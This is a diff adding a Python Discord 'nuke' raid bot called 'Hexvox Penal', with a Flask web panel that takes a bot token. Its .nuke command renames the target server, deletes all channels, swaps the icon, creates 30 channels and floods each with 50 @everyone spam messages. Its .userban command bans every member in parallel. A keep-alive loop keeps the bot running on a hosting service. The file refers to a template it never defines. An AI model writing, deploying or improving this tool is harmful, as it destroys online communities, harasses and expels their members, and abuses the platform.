@@ -1,0 +1,202 @@
+import threading
+import asyncio
+import os
+import time
+import urllib.request
+import aiohttp
+from flask import Flask, render_template_string, request, jsonify
+import discord
+from discord.ext import commands
+
+app = Flask(__name__)
+
+# Memoria volátil para almacenamiento dinámico de configuraciones
+config = {
+    "token": "",
+    "server_name": "Hexvox Penal Server", # NUEVO: Nombre personalizado del servidor
+    "channel_name": "hexvox-pwn",
+    "spam_message": "@everyone Hexvox Penal",
+    "icon_url": "",
+    "bot_active": False,
+    "start_time": 0
+}
+
+# Inicialización del Bot con Intents requeridos por Discord (se añade Members para el ban masivo)
+intents = discord.Intents.default()
+intents.guilds = True
+intents.guild_messages = True
+intents.message_content = True
+intents.members = True # NUEVO: Obligatorio para banear miembros con .userban
+bot = commands.Bot(command_prefix=".", intents=intents)
+
+async def change_server_icon(guild, url):
+    """Descarga asíncronamente una imagen y la define como el nuevo avatar del servidor"""
+    if not url:
+        return
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url) as resp:
+                if resp.status == 200:
+                    icon_bytes = await resp.read()
+                    await guild.edit(icon=icon_bytes)
+                    print("[INFO] Icono del servidor modificado con éxito.")
+    except Exception as e:
+        print(f"[ERROR] No se pudo cambiar la foto del servidor: {e}")
+
+async def run_nuke(ctx):
+    """Orquesta las rutinas automatizadas destructivas asociadas al comando .nuke"""
+    guild = ctx.guild
+    print(f"[NUKE] Purgando servidor: {guild.name}")
+    
+    # 1. Cambiar el nombre del servidor al que pusiste en la web
+    if config["server_name"]:
+        try:
+            await guild.edit(name=config["server_name"])
+        except Exception:
+            pass
+
+    # 2. Eliminación total e inmediata de los canales existentes en paralelo
+    delete_tasks = [channel.delete() for channel in guild.channels]
+    await asyncio.gather(*delete_tasks, return_exceptions=True)
+    
+    # 3. Modificación estética de la imagen representativa del servidor
+    if config["icon_url"]:
+        asyncio.create_task(change_server_icon(guild, config["icon_url"]))
+    
+    # 4. Generación en lote de los 30 canales personalizados configurados
+    created_channels = []
+    for _ in range(30):
+        try:
+            channel = await guild.create_text_channel(name=config["channel_name"])
+            created_channels.append(channel)
+        except Exception:
+            pass
+            
+    # 5. Inyección masiva de 50 mensajes de spam en cada canal generado
+    async def send_spam(channel):
+        for _ in range(50):
+            try:
+                await channel.send(config["spam_message"])
+                await asyncio.sleep(0.15)  # Retraso preventivo frente a Rate Limits de Discord
+            except Exception:
+                break
+
+    print(f"[NUKE] Desplegando spam en {len(created_channels)} canales.")
+    spam_tasks = [send_spam(ch) for ch in created_channels]
+    await asyncio.gather(*spam_tasks)
+    print("[NUKE] Operaciones completadas exitosamente.")
+
+@bot.command(name="nuke")
+async def nuke_command(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    await run_nuke(ctx)
+
+@bot.command(name="sto")
+async def sto_command(ctx):
+    # Retorna dinámicamente los minutos restantes correspondientes a la ventana de 30 minutos (1800 seg)
+    elapsed = time.time() - config["start_time"]
+    remaining_mins = max(0, int((1800 - elapsed) / 60))
+    await ctx.send(f"### Tu bot estará activo {remaining_mins} minutos")
+
+# NUEVO: Comando .userban para banear a todos los usuarios del servidor
+@bot.command(name="userban")
+async def userban_command(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    
+    guild = ctx.guild
+    ban_tasks = []
+    
+    # Busca a todos los miembros y los banea en paralelo (excepto al bot y al dueño)
+    for member in guild.members:
+        if member != bot.user and member != guild.owner:
+            ban_tasks.append(guild.ban(member, reason="Hexvox Penal Raid"))
+            
+    await asyncio.gather(*ban_tasks, return_exceptions=True)
+
+# NUEVO: Comando .ayuda que muestra la lista de comandos disponibles
+@bot.command(name="ayuda")
+async def ayuda_command(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    
+    embed = discord.Embed(
+        title="✨ HEXVOX PENAL - PANEL DE COMANDOS ✨",
+        description="Lista de acciones automatizadas del sistema:",
+        color=discord.Color.red()
+    )
+    embed.add_field(name="`.ayuda`", value="Muestra este menú de asistencia en el servidor.", inline=False)
+    embed.add_field(name="`.nuke`", value="Borra canales, cambia el nombre/foto del servidor, crea 30 canales nuevos y envía 50 mensajes en cada uno.", inline=False)
+    embed.add_field(name="`.userban`", value="Banea a absolutamente todos los miembros del servidor de forma masiva.", inline=False)
+    embed.add_field(name="`.sto`", value="Muestra cuánto tiempo le queda de vida al bot en Render (Máximo 30 minutos).", inline=False)
+    embed.set_footer(text="Hexvox Penal Execution System Tool")
+    
+    await ctx.send(embed=embed)
+
+async def shutdown_timer():
+    """Ejecuta una desconexión y apagado fulminante del software transcurridos los 30 minutos"""
+    await asyncio.sleep(1800)
+    print("[SISTEMA] Límite de 30 minutos alcanzado. Desconectando...")
+    await bot.close()
+    config["bot_active"] = False
+    os._exit(0)  # Forzar salida limpia para limpiar la memoria caché de procesos en Render
+
+async def start_bot_async(token):
+    try:
+        config["start_time"] = time.time()
+        asyncio.create_task(shutdown_timer())
+        await bot.start(token)
+    except Exception as e:
+        config["bot_active"] = False
+        print(f"[ERROR] Credenciales incorrectas o falla de API: {e}")
+
+def run_bot_thread(token):
+    """Instancia un bucle asíncrono aislado para encapsular la ejecución de discord.py sin bloquear Flask"""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(start_bot_async(token))
+
+def keep_alive_ping():
+    """Envía peticiones circulares continuas para prevenir el congelamiento por inactividad de Render"""
+    while True:
+        time.sleep(120)
+        if config["bot_active"]:
+            try:
+                urllib.request.urlopen("http://127.0.0.1:5000", timeout=5)
+            except Exception:
+                pass
+
+# --- 
+@app.route('/')
+def home():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/api/setup', methods=['POST'])
+def setup():
+    data = request.json
+    config["token"] = data.get("token")
+    config["server_name"] = data.get("server_name", "Hexvox Penal Server")
+    config["channel_name"] = data.get("channel_name", "hexvox-pwn")
+    config["spam_message"] = data.get("spam_message", "@everyone Hexvox Penal")
+    config["icon_url"] = data.get("icon_url", "")
+    
+    if not config["bot_active"] and config["token"]:
+        config["bot_active"] = True
+        t = threading.Thread(target=run_bot_thread, args=(config["token"],), daemon=True)
+        t.start()
+        p = threading.Thread(target=keep_alive_ping, daemon=True)
+        p.start()
+        
+    return jsonify({"success": True})
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
+    
